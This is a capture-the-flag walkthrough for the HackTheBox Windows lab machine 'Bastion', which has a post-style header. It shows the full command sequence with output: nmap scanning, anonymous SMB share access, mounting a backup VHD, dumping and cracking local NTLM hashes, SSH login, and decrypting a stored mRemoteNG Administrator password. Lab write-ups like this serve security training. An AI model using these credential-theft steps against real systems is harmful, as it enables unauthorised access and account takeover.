---
layout: post
title: HackTheBox Bastion
date: 2019-04-27
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Bastion is an Easy level WIndows box which contains a VHD ( Virtual Hard Disk ) image from which credentials can be extracted. After logging in, the software MRemoteNG is found to be installed which stores passwords insecurely, and from which credentials can be extracted. ([Source](https://app.hackthebox.com/machines/Bastion/))

# Enumeration

```bash
❯ nmap -sC -sV -A 10.10.10.134
Nmap scan report for 10.10.10.134
Host is up (0.021s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/17%OT=22%CT=1%CU=33305%PV=Y%DS=2%DC=T%G=Y%TM=676
OS:12379%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S
OS:%TS=A)OPS(O1=M53ANW8ST11%O2=M53ANW8ST11%O3=M53ANW8NNT11%O4=M53ANW8ST11%O
OS:5=M53ANW8ST11%O6=M53AST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6
OS:=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53ANW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%
OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-17T06:54:10
|_  start_date: 2024-12-17T06:17:37
|_clock-skew: mean: -34m25s, deviation: 34m36s, median: -14m27s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-12-17T07:54:09+01:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 995/tcp)
HOP RTT     ADDRESS
1   7.97 ms 10.10.16.1
2   4.56 ms 10.10.10.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.76 seconds
```

Notice that the SMB service is open. Lets try to use SMBClient to list the shares. 

>   Note: tried `enum4linux` and `smbmap` but it couldn’t work.

```bash
❯ smbclient -L \\\\10.10.10.134\\
Password for [WORKGROUP\shiro]: <no password>

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

There seems to be a `Backup` Share that we can access.

```bash
❯ smbclient \\\\10.10.10.134\\Backups
Password for [WORKGROUP\shiro]: <no password>
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 16 18:02:11 2019
  ..                                  D        0  Tue Apr 16 18:02:11 2019
  note.txt                           AR      116  Tue Apr 16 18:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 20:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 20:44:02 2019

		5638911 blocks of size 4096. 1178002 blocks available
```

Lets read the `note.txt` file.

```bash
> cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

It seems to be something about a backup file. Most likely it is a hint for us.

Lets mount the Samba Share locally.

```bash
❯ sudo mkdir -p /mnt/smb
❯ sudo mount -t cifs //10.10.10.134/Backups /mnt/smb
Password for root@//10.10.10.134/Backups: <no password>
```

```bash
/mnt/smb/WindowsImageBackup/L4mpje-PC/Backup ❯ ls
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
BackupSpecs.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
```

There seems to be some `vhd` files in the Backup folder. Googling around led to a [Medium article](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25) that explains how to mount `vhd` files on Kali.

``` bash
> sudo apt install libguestfs-tools
> sudo mkdir -p /mnt/vhd
> sudo guestmount --add '/mnt/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro /mnt/vhd
```

# Exploitation

```bash
/mnt ❯ sudo su
/mnt ❯ cd vhd
/mnt/vhd ❯ ls
'$Recycle.Bin'            'Program Files'  'System Volume Information'   autoexec.bat
'Documents and Settings'   ProgramData      Users                        config.sys
 PerfLogs                  Recovery         Windows                      pagefile.sys
❯ pwd
/mnt/vhd/Windows/System32/config
❯ ls
...
SAM
SAM.LOG
SAM.LOG1
SAM.LOG2
SECURITY
SECURITY.LOG
SECURITY.LOG1
SECURITY.LOG2
SOFTWARE
SOFTWARE.LOG
SOFTWARE.LOG1
SOFTWARE.LOG2
SYSTEM
SYSTEM.LOG
SYSTEM.LOG1
SYSTEM.LOG2
```

Nice, we are able to read the `SAM`, `SYSTEM` and `SECURITY` keys. With these keys, we can use `impacket-secretsdump` to dump the NTLM hashes.

``` bash
❯ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... 
```

Nice, we can crack the hash for `L4mpje` user.

```bash
❯ hashcat -m 1000 '26112010952d963c8dc4217daec986d9' /usr/share/wordlists/rockyou.txt
...
26112010952d963c8dc4217daec986d9:bureaulampje
```

Lets SSH as `L4mpje` user.

```bash
❯ ssh L4mpje@10.10.10.134

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
l4mpje@BASTION C:\Users\L4mpje>type Desktop\user.txt
b6230043379272f4b71f11740da4886e    
```

Enumerating around, there is an interesting `mRemoteNG` folder.

```bash
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir            
 Volume in drive C has no label.
 Volume Serial Number is 1B7D-E692
 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG

22-02-2019  14:03    <DIR>          .
22-02-2019  14:03    <DIR>          ..
22-02-2019  14:03             6.316 confCons.xml
22-02-2019  14:02             6.194 confCons.xml.20190222-1402277353.backup
22-02-2019  14:02             6.206 confCons.xml.20190222-1402339071.backup
22-02-2019  14:02             6.218 confCons.xml.20190222-1402379227.backup
22-02-2019  14:02             6.231 confCons.xml.20190222-1403070644.backup
22-02-2019  14:03             6.319 confCons.xml.20190222-1403100488.backup
22-02-2019  14:03             6.318 confCons.xml.20190222-1403220026.backup
22-02-2019  14:03             6.315 confCons.xml.20190222-1403261268.backup
22-02-2019  14:03             6.316 confCons.xml.20190222-1403272831.backup
22-02-2019  14:03             6.315 confCons.xml.20190222-1403433299.backup
22-02-2019  14:03             6.316 confCons.xml.20190222-1403486580.backup
22-02-2019  14:03                51 extApps.xml
22-02-2019  14:03             5.217 mRemoteNG.log
22-02-2019  14:03             2.245 pnlLayout.xml
22-02-2019  14:01    <DIR>          Themes
              14 File(s)         76.577 bytes
               3 Dir(s)   4.824.473.600 bytes free   
```

There is a `confCons.xml` file that has the `Administrator` password hash.

```bash
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                                
<?xml version="1.0" encoding="utf-8"?>               
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                    
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Set
tings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" 
DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" 
InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />                                                                                               
<Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostname="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC"
VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false"
InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>   
```


# Privilege Escalation

Googling for `mremoteng decrypt` leads to this [GitHub Repo](https://github.com/haseebT/mRemoteNG-Decrypt).

```bash
❯ git clone https://github.com/haseebT/mRemoteNG-Decrypt
❯ cd mRemoteNG-Decrypt

❯ python3 mremoteng_decrypt.py -s 'aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=='
Password: thXLHM96BeKL0ER2
```

Now we can SSH with `Administrator`.

```bash
❯ ssh Administrator@10.10.10.134

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
administrator@BASTION C:\Users\Administrator>type Desktop\root.txt
9afa7bdc0dae4a62bb28217bebe7053b 
```

